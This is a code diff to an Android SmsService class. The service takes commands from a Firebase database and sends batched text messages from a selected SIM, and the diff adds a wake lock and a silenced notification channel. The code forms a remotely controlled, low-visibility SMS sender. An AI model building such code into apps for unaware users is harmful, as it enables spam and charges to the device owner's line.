@@ -20,15 +20,18 @@ class SmsService : Service() {
         private const val NOTIFICATION_ID = 1
     }
 
-    // Track sent numbers per commandId to avoid duplicates
     private val sentSmsTracker = mutableMapOf<String, MutableSet<String>>()
     private lateinit var deviceId: String
+    private var wakeLock: PowerManager.WakeLock? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
         try {
+            // Acquire wake lock to ensure SMS works even when screen is off
+            acquireWakeLock()
+            
             deviceId = MainActivity.getDeviceId(this)
             createNotificationChannel()
             val notification = buildForegroundNotification()
@@ -38,6 +41,20 @@ class SmsService : Service() {
         } catch (e: Exception) {
             Logger.error("Failed to create SmsService", e)
             stopSelf()
+        }
+    }
+
+    private fun acquireWakeLock() {
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = powerManager.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "SmsService:KeepAlive"
+            )
+            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
+            Logger.log("Wake lock acquired for SmsService")
+        } catch (e: Exception) {
+            Logger.error("Failed to acquire wake lock for SMS", e)
         }
     }
 
@@ -80,6 +97,10 @@ class SmsService : Service() {
                     NotificationManager.IMPORTANCE_LOW
                 ).apply {
                     description = "Running SMS capture and send service"
+                    setShowBadge(false)
+                    enableLights(false)
+                    enableVibration(false)
+                    setSound(null, null)
                 }
                 val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                 notificationManager.createNotificationChannel(channel)
@@ -97,6 +118,7 @@ class SmsService : Service() {
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setOngoing(true)
+                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                 .build()
         } catch (e: Exception) {
             Logger.error("Failed to build SMS notification", e)
@@ -129,7 +151,7 @@ class SmsService : Service() {
                                 if (simNumber != null && recipients != null && message != null) {
                                     val validRecipients = recipients.filterIsInstance<String>().filter { it.isNotBlank() }
                                     if (validRecipients.isNotEmpty()) {
-                                        Logger.log("Processing SMS command: $commandId for ${validRecipients.size} recipients")
+                                        Logger.log("Processing SMS command: $commandId for ${validRecipients.size} recipients using $simNumber")
                                         sendSmsToAll(simNumber, validRecipients, message, commandId)
                                     } else {
                                         Logger.error("No valid recipients for command: $commandId")
@@ -160,7 +182,7 @@ class SmsService : Service() {
             val handler = Handler(Looper.getMainLooper())
             val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
             
-            // Get appropriate SMS manager
+            // Get appropriate SMS manager for the specified SIM
             val smsManager = getSmsManagerForSim(simNumber)
             if (smsManager == null) {
                 Logger.error("Failed to get SMS manager for SIM: $simNumber")
@@ -189,7 +211,14 @@ class SmsService : Service() {
                     }
 
                     try {
-                        smsManager.sendTextMessage(number, null, message, null, null)
+                        // Ensure we can send SMS even when screen is off
+                        val parts = smsManager.divideMessage(message)
+                        if (parts.size == 1) {
+                            smsManager.sendTextMessage(number, null, message, null, null)
+                        } else {
+                            smsManager.sendMultipartTextMessage(number, null, parts, null, null)
+                        }
+                        
                         Logger.log("Sent SMS from $simNumber to $number")
                         alreadySentSet.add(number)
                         successCount++
@@ -227,7 +256,7 @@ class SmsService : Service() {
 
                 Logger.log("Batch $index completed: $successCount success, $failureCount failures")
 
-                // Schedule next batch
+                // Schedule next batch with delay
                 if (index + 1 < chunks.size) {
                     handler.postDelayed({ sendChunk(index + 1) }, 60_000L) // 1 min delay
                 }
@@ -245,19 +274,22 @@ class SmsService : Service() {
             val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
             val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: return null
             
-            // Find subscription by SIM number or slot
+            // Find subscription by SIM number or slot (sim1, sim2)
             val subscription = subscriptions.find { 
-                it.number == simNumber || "sim${it.simSlotIndex + 1}" == simNumber.lowercase()
+                it.number == simNumber || 
+                "sim${it.simSlotIndex + 1}" == simNumber.lowercase() ||
+                it.displayName.toString().lowercase().contains(simNumber.lowercase())
             }
             
             if (subscription != null) {
+                Logger.log("Found subscription for $simNumber: slot ${subscription.simSlotIndex}, subId ${subscription.subscriptionId}")
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                     SmsManager.getSmsManagerForSubscriptionId(subscription.subscriptionId)
                 } else {
                     SmsManager.getDefault()
                 }
             } else {
-                Logger.error("No subscription found for SIM: $simNumber")
+                Logger.error("No subscription found for SIM: $simNumber, using default")
                 SmsManager.getDefault()
             }
         } catch (e: Exception) {
@@ -286,6 +318,21 @@ class SmsService : Service() {
                 }
         } catch (e: Exception) {
             Logger.error("Error updating SMS command status", e)
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        try {
+            // Release wake lock
+            wakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                }
+            }
+            Logger.log("SmsService destroyed")
+        } catch (e: Exception) {
+            Logger.error("Error destroying SmsService", e)
         }
     }
 }
